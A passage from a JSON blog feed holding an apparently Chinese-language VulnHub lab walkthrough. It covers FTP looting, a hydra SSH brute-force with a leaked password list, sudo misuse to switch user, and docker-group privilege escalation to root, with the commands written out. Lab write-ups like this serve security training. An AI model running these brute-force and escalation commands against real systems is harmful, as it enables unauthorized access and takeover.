ftp:ftpp@ssword</p>\n<h3 id=\"ftp-信息收集\"><a class=\"markdownIt-Anchor\" href=\"#ftp-信息收集\">#</a> FTP 信息收集</h3>\n<p>登陆到 ftp 服务器查看存在 ftp 中的有哪些文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-715.png\" width=\"480\" alt=\"Image\">\n<p>将 ftp 服务中的资料下载到本地查看内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-716.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; Infromation 中的内容如下，透露出来一个用户名 robin，并且他的密码强度弱 p_lists.txt 为一些密码，很显然需要通过 hydra 爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-717.png\" width=\"520\" alt=\"Image\">\n<p>用 robin 作为用户名，p_lists 做为密码进行爆破 ssh，得到了密码<br>\n <code>hydra -l robin -P p_lists.txt ssh://192.168.0.153 -f -t 4 -I -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-718.png\" width=\"700\" alt=\"Image\">\n<p>通过 ssh 命令成功登陆到了靶机中<br>\n <code>ssh 192.168.0.153 -l robin</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-719.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"docker-提权\"><a class=\"markdownIt-Anchor\" href=\"#docker-提权\">#</a> docker 提权</h3>\n<p><code>sudo -l</code>  查看有无权限设置错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-720.png\" width=\"520\" alt=\"Image\">\n<p>发现可以以 jerry 的身份执行这个脚本  <code>sudo -u jerry /home/robin/project/feedback.sh</code> <br>\n 执行后，输入两个 bash，拿到了 jerry 的权限</p>\n<p>用 python3 调整为一个比较美观的终端: <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-721.png\" width=\"450\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行<span class=\"built_in\">id</span>的时候发现属于docker组，尝试用docker提权</span></span><br><span class=\"line\">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">调整shell输出比较美观的shell</span></span><br><span class=\"line\">SHELL=/bin/bash script -q /dev/null</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-722.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        }
    ]
}